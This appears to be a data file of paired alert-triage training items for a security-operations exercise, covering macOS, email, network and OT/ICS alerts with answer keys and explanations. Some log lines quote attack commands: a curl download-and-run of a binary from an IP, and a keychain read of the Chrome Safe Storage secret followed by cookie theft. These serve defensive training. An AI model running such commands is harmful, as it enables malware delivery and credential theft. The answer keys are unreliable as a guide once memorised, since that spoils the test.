@@ -1,0 +1,271 @@
+# ON SHIFT alerts, drop 2, part 4: macOS, email, network and OT/ICS pairs (y61-y80)
+- id: y61
+  d: macos
+  src: 'macOS · Unified Log (ESF)'
+  t: 'LaunchAgent created'
+  h: 'MBP-ENG-12 · tchen'
+  l: ['file created: ~/Library/LaunchAgents/com.apple.systemupdate.plist (RunAtLoad true)', 'ProgramArguments: /Users/Shared/.sysupd/updater --silent', 'creator: unsigned binary ~/Downloads/PDF-Converter.app/Contents/MacOS/PDFConv, quarantine flag cleared', 'label imitates an Apple service; real Apple agents live in /System and /Library, not the user folder']
+  v: 1
+  x: T1543.001
+  c: macos-launchagent-new
+  k: [0, 1, 2]
+  diff: 2
+  say: 'An unsigned downloaded app created a user LaunchAgent with an Apple-style label that runs a hidden binary from the shared folder at login.'
+  tell: 'Persistence on macOS is a plist and a path. A com.apple.* label in ~/Library/LaunchAgents is impersonation (Apple''s own live in /System and /Library), the program is a hidden binary in /Users/Shared, and the creator is an unsigned app straight from Downloads with its quarantine flag cleared.'
+- id: y62
+  d: macos
+  src: 'macOS · Unified Log (ESF)'
+  t: 'LaunchAgent created'
+  h: 'MBP-FIN-03 · ewalsh'
+  l: ['file created: /Library/LaunchAgents/com.microsoft.update.agent.plist (installed by the Microsoft AutoUpdate package)', 'ProgramArguments: /Library/Application Support/Microsoft/MAU2.0/Microsoft Update Assistant.app/Contents/MacOS/Microsoft Update Assistant', 'creator: Microsoft AutoUpdate installer (signed, notarized), pushed by the Jamf policy "Office updates"', 'plist is root-owned in /Library and matches the vendor package receipt']
+  v: 0
+  x: T1543.001
+  c: macos-launchagent-new
+  k: [2, 3]
+  diff: 2
+  trap: scary
+  say: 'A system-library LaunchAgent was installed by the signed, notarized Microsoft updater package pushed by device management, with a matching receipt.'
+  tell: 'LaunchAgents are how every macOS updater runs. This one is in /Library (root-owned), installed by a signed and notarized Microsoft package pushed by Jamf, and it matches a package receipt. The malicious twin lives in ~/Library with a lookalike label and an unsigned creator.'
+- id: y63
+  d: macos
+  src: 'macOS · Unified Log (ESF)'
+  t: 'TCC permission granted'
+  h: 'MBP-DES-31 · okim'
+  l: ['event: TCC.db written directly (sqlite3 ~/Library/Application Support/com.apple.TCC/TCC.db, INSERT INTO access)', 'grants: kTCCServiceScreenCapture and kTCCServiceAccessibility to com.apple.helper.agent (not a real Apple bundle id)', 'process: osascript launched by ~/Library/Caches/.cfg/runner; the user saw no consent prompt', 'SIP is enabled; the write worked because the parent process has Full Disk Access']
+  v: 1
+  x: T1548
+  c: macos-tcc-grant
+  k: [1, 2]
+  diff: 3
+  say: 'The privacy permissions database was written directly to grant screen recording and accessibility to a fake Apple bundle identifier, with no consent prompt shown.'
+  tell: 'macOS shows a consent prompt for screen capture and accessibility, and a direct write to TCC.db skips it. A bundle id that looks Apple but is not, a runner hiding in a user cache directory and no prompt: someone with Full Disk Access just gave their implant the keys to your screen and keyboard.'
+- id: y64
+  d: macos
+  src: 'macOS · Unified Log (ESF)'
+  t: 'TCC permission granted'
+  h: 'MBP-SAL-18 · amoreno'
+  l: ['event: TCC grant via an MDM Privacy Preferences Policy Control profile "PPPC-RemoteSupport"', 'grants: kTCCServiceScreenCapture and kTCCServiceAccessibility to com.corp.remotesupport (the approved remote support client)', 'profile signed by the corp MDM, scoped to the IT-managed smart group (1,420 Macs)', 'delivered through the MDM channel at enrollment; no TCC.db write and no user-level process involved']
+  v: 0
+  x: T1548
+  c: macos-tcc-grant
+  k: [0, 2]
+  diff: 3
+  trap: scary
+  say: 'Screen capture and accessibility were granted to the approved remote support client by a signed MDM privacy profile applied through the management channel.'
+  tell: 'Permission grants are not bad by themselves: this one is a PPPC profile signed by your MDM, scoped to the IT smart group and delivered through the management channel, with no user process touching TCC.db. The malicious version writes the database directly and gets no prompt.'
+- id: y65
+  d: macos
+  src: 'macOS · Unified Log (ESF)'
+  t: 'Quarantine attribute removed'
+  h: 'MBA-LEG-06 · sfox'
+  l: ['exec: xattr -c ~/Downloads/Invoice_Review.app, then open', 'file origin: attachment from an external sender via Mail, downloaded 90 s earlier, unsigned and not notarized', 'first launch spawned: osascript, then curl -o /tmp/u hxxp://45.x.x.x/u && chmod +x /tmp/u && /tmp/u', 'Gatekeeper assessment (spctl): rejected']
+  v: 1
+  x: T1553.001
+  c: macos-quarantine-strip
+  k: [0, 1]
+  diff: 2
+  say: 'The quarantine flag was stripped from an unsigned, unnotarized email-attachment app, and its first launch fetched and ran a binary from temp.'
+  tell: 'xattr -c on a freshly downloaded unsigned app is the user (or a lure) defeating Gatekeeper. The app came from an email attachment 90 seconds ago, spctl rejects it, and the first thing it does is curl a binary into /tmp. Treat it as infostealer delivery.'
+- id: y66
+  d: macos
+  src: 'macOS · Unified Log (ESF)'
+  t: 'Quarantine attribute removed'
+  h: 'MBP-DEV-09 · jpark'
+  l: ['exec: xattr -dr com.apple.quarantine ./build/Release/MyTool.app', 'file origin: built locally by Xcode 16 in ~/code/mytool/build, signed with the developer''s Apple Development certificate', 'parent: zsh in Terminal, working directory inside the user''s own git checkout', 'no network activity from the app on first launch; opened from the build folder only']
+  v: 0
+  x: T1553.001
+  c: macos-quarantine-strip
+  k: [1, 2]
+  diff: 2
+  trap: scary
+  say: 'A developer cleared the quarantine flag on an app built locally in Xcode, signed with their development certificate, from their own checkout.'
+  tell: 'xattr on a quarantine flag is a developer habit and a Gatekeeper bypass. Origin decides: this app was built on the same machine by Xcode, signed with the developer''s own certificate, run from their git checkout, and does nothing on the network. The attack app came from an email 90 seconds earlier.'
+- id: y67
+  d: macos
+  src: 'macOS · Unified Log (ESF)'
+  t: 'Keychain secret read'
+  h: 'MBP-ENG-21 · nrao'
+  l: ['exec: security find-generic-password -ga "Chrome Safe Storage" -w', 'parent: sh spawned by /private/tmp/.k/update (unsigned, ad-hoc signature)', 'user was at the lock screen; keychain unlocked by a stored session, no password prompt shown', 'followed by reads of ~/Library/Application Support/Google/Chrome/Default/Login Data and Cookies']
+  v: 1
+  x: T1555.001
+  c: macos-keychain-read
+  k: [0, 3]
+  diff: 3
+  say: 'An unsigned binary in temp read the Chrome keychain secret, then browser logins and cookies, with the screen locked.'
+  tell: 'The Chrome Safe Storage secret decrypts the browser''s saved passwords and cookies. It was read by a shell spawned from an ad-hoc-signed binary in /private/tmp while the user was away, then followed by the Login Data and Cookies files: infostealer, with an MFA-bypassing cookie haul.'
+- id: y68
+  d: macos
+  src: 'macOS · Unified Log (ESF)'
+  t: 'Keychain secret read'
+  h: 'MBP-IT-02 · mstone'
+  l: ['exec: security find-certificate -a -c "Corp Device Identity" -p', 'parent: /usr/local/jamf/bin/jamf (the Jamf binary), policy "Compliance check"', 'reads certificate metadata only (no -g or -w flag, no private key or password output)', 'runs every 4 h on all 1,420 managed Macs']
+  v: 0
+  x: T1555.001
+  c: macos-keychain-read
+  k: [1, 2]
+  diff: 2
+  trap: scary
+  say: 'The device management agent ran a keychain certificate lookup for compliance, reading metadata only with no secret output, on its four-hour schedule.'
+  tell: 'The security tool against the keychain is both the stealer''s weapon and the MDM''s compliance check. The flags decide: -g and -w print secrets, while find-certificate with -p prints a public certificate. The parent is the Jamf binary on a schedule, across the fleet.'
+- id: y69
+  d: email
+  src: 'Defender for Office · EmailEvents'
+  t: 'External calendar invite'
+  h: 'To: ceo-office@corp.com'
+  l: ['from: scheduler@m0nday-meet.com, SPF pass, DKIM pass (domain registered 2 days ago)', 'attachment: invite.ics with a description link to hxxps://m0nday-meet[.]com/join?u=ceo-office', 'link lands on a Microsoft sign-in lookalike that proxies the real login page', 'same invite sent to 9 executive assistants within 5 min']
+  v: 1
+  x: T1566.002
+  c: calendar-invite-phish
+  k: [0, 2]
+  diff: 3
+  say: 'An external calendar invite from a two-day-old domain carries a join link to a sign-in page, sent to ten executive assistants.'
+  tell: 'Authentication passing means nothing when the domain is the sender''s own: SPF and DKIM pass for m0nday-meet.com, registered two days ago. A calendar invite is a way past mail link scanning, the join link goes to an AiTM sign-in page, and the same invite hit ten executive inboxes in five minutes.'
+- id: y70
+  d: email
+  src: 'Defender for Office · EmailEvents'
+  t: 'External calendar invite'
+  h: 'To: ceo-office@corp.com'
+  l: ['from: noreply@zoom.us via calendar-notification.zoom.us, SPF pass, DKIM aligned with zoom.us, DMARC pass', 'attachment: invite.ics with join link https://corp.zoom.us/j/9981234567 (corp tenant vanity URL)', 'organizer is the board secretary (known contact for 3 years), meeting on the existing board series', 'invite sent to the 4 attendees on the series only']
+  v: 0
+  x: T1566.002
+  c: calendar-invite-phish
+  k: [0, 1]
+  diff: 3
+  trap: scary
+  say: 'A Zoom calendar invite with DMARC-aligned authentication and a corporate-tenant join link came from the known board secretary for the existing board meeting series.'
+  tell: 'Same format, opposite verdict. The domain is zoom.us with aligned DKIM and DMARC, the link is your own corporate Zoom tenant, the organizer is a three-year contact on an existing series, and the recipient list is the four people on it.'
+- id: y71
+  d: email
+  src: 'Exchange Online · OfficeActivity'
+  t: 'Mailbox permission added'
+  h: 'mailbox: cfo@corp.com'
+  l: ['operation: Add-MailboxPermission · FullAccess granted to svc-mailarchive@corp.com, AutoMapping false', 'actor: helpdesk.tier1@corp.com (not in the Exchange admin or exec-assistant workflow)', 'svc-mailarchive was created 2 h earlier, no sign-in history until 5 min after the grant', 'then: 1,900 items read via MailItemsAccessed from 185.x.x.x']
+  v: 1
+  x: T1098.002
+  c: mailbox-delegate-add
+  k: [0, 2]
+  diff: 3
+  say: 'Full access to the CFO mailbox was granted to a two-hour-old account, auto-mapping off, by a help desk user; 1,900 items were read.'
+  tell: 'AutoMapping false keeps the new access out of the CFO''s Outlook, so nobody sees the mailbox appear. The grantee is two hours old, the grantor is not in the Exchange admin or assistant workflow, and thousands of items are read from a hosting IP right after the first sign-in.'
+- id: y72
+  d: email
+  src: 'Exchange Online · OfficeActivity'
+  t: 'Mailbox permission added'
+  h: 'mailbox: cfo@corp.com'
+  l: ['operation: Add-MailboxPermission · FullAccess granted to e.huang@corp.com (new executive assistant), AutoMapping true', 'actor: exch-admin-automation, run by the role-change workflow (HR event, manager confirmed)', 'e.huang has an 8-month history and signed in from a managed device on the office network', 'afterwards: ordinary inbox and calendar reads from the managed device only']
+  v: 0
+  x: T1098.002
+  c: mailbox-delegate-add
+  k: [1, 2]
+  diff: 3
+  trap: scary
+  say: 'The role-change workflow granted the new executive assistant full access to the CFO mailbox with auto-mapping on, used from a managed device.'
+  tell: 'Full access to the CFO mailbox should make you look twice, and here it checks out: the grantor is the HR-driven workflow, the grantee is an eight-month employee, AutoMapping is on so it shows in Outlook, and usage is from a managed office device.'
+- id: y73
+  d: network
+  src: 'Firewall · Fortinet'
+  t: 'Direct SMTP to the internet'
+  h: 'WS-ENG-0518 → external MX hosts'
+  l: ['TCP 25 to 311 distinct external MX hosts in 6 min from a workstation', 'sessions: STARTTLS, 4 KB each, same HELO string "localhost"', 'source process (EDR): svchost-update.exe in %APPDATA%, unsigned', 'mail egress policy: only the gateways 10.2.2.10 and 10.2.2.11 may send port 25']
+  v: 1
+  x: T1071.003
+  c: direct-smtp-egress
+  k: [0, 3]
+  diff: 2
+  say: 'A workstation opened port 25 sessions to hundreds of external mail servers from an unsigned app data process; only gateways may send mail.'
+  tell: 'Hundreds of distinct external MX hosts in six minutes from one workstation is a spam or relay bot, and the process is an unsigned binary in AppData. Egress policy says only the gateways may speak SMTP. Contain the host and check what it sent.'
+- id: y74
+  d: network
+  src: 'Firewall · Fortinet'
+  t: 'Direct SMTP to the internet'
+  h: 'SRV-MAIL-03 → external MX hosts'
+  l: ['TCP 25 to 311 distinct external MX hosts in 6 min from SRV-MAIL-03', 'sessions: STARTTLS, DKIM-signed mail, HELO mail03.corp.com matches PTR and SPF', 'source process (EDR): MSExchangeTransport.exe, signed Microsoft', 'source is one of the two registered mail gateways allowed to send port 25 (10.2.2.10)']
+  v: 0
+  x: T1071.003
+  c: direct-smtp-egress
+  k: [2, 3]
+  diff: 2
+  trap: scary
+  say: 'A registered mail gateway opened port 25 sessions to many external mail servers from its Exchange transport process, with matching HELO, PTR and SPF.'
+  tell: 'Same fan-out to hundreds of MX hosts, opposite source. SRV-MAIL-03 is a registered gateway, the process is the Exchange transport service, and HELO, PTR and SPF line up. Port 25 fan-out is normal outbound mail from the right host and a bot from any other.'
+- id: y75
+  d: network
+  src: 'Firewall · Palo Alto TRAFFIC'
+  t: 'Inbound RDP from internet allowed'
+  h: '185.x.x.x → SRV-APP-12:3389'
+  l: ['app: ms-rdp, action: allow, session 2 h 14 min, 41 MB', 'rule: "Vendor-Access-Temp" (created 9 days ago, source any, review date expired)', 'Windows 4624 type 10 on SRV-APP-12 for CORP\svc_vendor from the same IP', 'source IP is on a public credential-stuffing list; no VPN or gateway session in front']
+  v: 1
+  x: T1133
+  c: rdp-exposure
+  k: [1, 3]
+  diff: 2
+  say: 'A two-hour RDP session from an internet address reached an application server through a temporary any-source rule, with no VPN or gateway.'
+  tell: 'RDP exposed to the internet through a temporary vendor rule that never expired, a successful type 10 logon for a service account, and a source IP on a credential-stuffing list. Someone logged in. Close the rule, kill the session, and look at what svc_vendor touched.'
+- id: y76
+  d: network
+  src: 'Firewall · Palo Alto TRAFFIC'
+  t: 'Inbound RDP from internet allowed'
+  h: '34.x.x.x (ZTNA gateway) → SRV-APP-12:3389'
+  l: ['app: ms-rdp, action: allow, session 48 min, 9 MB', 'rule: "ZTNA-Gateway-RDP" (source: the ZTNA provider published egress range only, reviewed quarterly)', 'Windows 4624 type 10 for CORP\vendor.jlee from the gateway IP; the gateway session shows MFA and device posture passed', 'session recorded by the gateway; vendor account enabled for this window by the access request workflow']
+  v: 0
+  x: T1133
+  c: rdp-exposure
+  k: [1, 2]
+  diff: 2
+  trap: scary
+  say: 'An inbound RDP session came through the zero trust gateway published egress range under a reviewed rule, with MFA, posture check and session recording.'
+  tell: 'Both alerts say RDP from an outside IP. The difference is the front door: here the source is the gateway''s published egress range under a rule reviewed quarterly, the gateway enforced MFA and device posture, and the session was recorded. The attack path has none of those.'
+- id: y77
+  d: network
+  src: 'OT NDR · Modbus/TCP'
+  t: 'Modbus write to PLC'
+  h: '10.20.31.77 → PLC-FILTR-02 (10.60.2.14)'
+  l: ['function code 16 (write multiple registers), 12 registers 40101-40112, 3 writes in 40 s', 'source 10.20.31.77 is an office workstation (VLAN 20), not in the registered engineering station list', 'PLC-FILTR-02 sets filtration pump speed; baseline writers are HMI-FILTR-01 and EWS-OT-04 only', 'values are 10x the normal setpoint range; no operator login on the HMI at that time']
+  v: 1
+  x: T1565.001
+  c: ot-plc-write-source
+  k: [1, 3]
+  diff: 3
+  say: 'An office workstation wrote twelve registers to a filtration PLC three times, with values ten times the baseline and no operator on the HMI.'
+  tell: 'Modbus has no authentication, so the source is the control. An office VLAN host writing setpoints to a PLC whose only baseline writers are the HMI and the engineering station, at ten times the normal range with nobody logged in, is process manipulation. Escalate to OT, do not just block the IP.'
+- id: y78
+  d: network
+  src: 'OT NDR · Modbus/TCP'
+  t: 'Modbus write to PLC'
+  h: '10.60.9.11 (EWS-OT-04) → PLC-FILTR-02 (10.60.2.14)'
+  l: ['function code 16 (write multiple registers), 12 registers 40101-40112, 1 write', 'source EWS-OT-04 is on the registered engineering station list (VLAN 60, OT zone)', 'values within the documented setpoint range (+4% vs last write), operator login on EWS-OT-04 (badge and MFA) 2 min earlier', 'maintenance window "FILTR seasonal tuning" scheduled in the OT CMMS for today']
+  v: 0
+  x: T1565.001
+  c: ot-plc-write-source
+  k: [1, 2]
+  diff: 3
+  trap: scary
+  say: 'A registered engineering station wrote twelve registers to a filtration PLC once, within the documented range, after an operator login with MFA.'
+  tell: 'Same function code, same registers, same PLC. The writer is a registered engineering station in the OT zone, the values sit inside the documented range, an operator logged in with a badge and MFA first, and the CMMS has a maintenance window for it. Context, not the Modbus call, is the evidence.'
+- id: y79
+  d: network
+  src: 'OT NDR · Remote access'
+  t: 'Vendor session into OT DMZ'
+  h: 'vendor.adm → JUMP-OT-01'
+  l: ['RDP from the corporate VPN pool into JUMP-OT-01 as vendor.adm (shared vendor account, password last changed 214 days ago)', 'time: 02:40 local Sunday, outside the vendor support window (Mon-Fri 08:00-18:00)', 'from JUMP-OT-01: SMB and RDP attempts to 14 hosts in the control VLAN, 3 succeeded', 'bypassed the PAM broker: no recorded session, no check-out record']
+  v: 1
+  x: T1133
+  c: ot-vendor-access
+  k: [1, 3]
+  diff: 3
+  say: 'The shared vendor account reached the OT jump host at 02:40 on a Sunday, outside its window and the access broker, then probed control hosts.'
+  tell: 'A vendor account with a 214-day-old shared password, used at 02:40 on a Sunday outside the support window, skipping the PAM broker, then fanning out SMB and RDP to the control VLAN with three successes. That is not maintenance, that is someone using vendor access as a bridge into OT.'
+- id: y80
+  d: network
+  src: 'OT NDR · Remote access'
+  t: 'Vendor session into OT DMZ'
+  h: 'vendor.jlee → JUMP-OT-01'
+  l: ['RDP from the PAM broker (10.60.250.5) into JUMP-OT-01 as vendor.jlee (named account, password vaulted and rotated after each checkout)', 'time: Tue 14:20 local, inside the vendor support window; check-out linked to work order WO-88231 in the OT CMMS', 'session recorded by the PAM broker; the supervisor approved the session start', 'from JUMP-OT-01: one RDP to EWS-OT-04 only, the host named in the work order']
+  v: 0
+  x: T1133
+  c: ot-vendor-access
+  k: [0, 3]
+  diff: 3
+  trap: scary
+  say: 'A named vendor engineer connected through the access broker inside the support window, recorded, and touched only the engineering station named in the work order.'
+  tell: 'Same jump host, same vendor firm, opposite everything else: a named account with a vaulted password, the broker as the source, inside the support window, a work order behind it, a recorded session approved by the supervisor, and one hop to the host in the work order.'
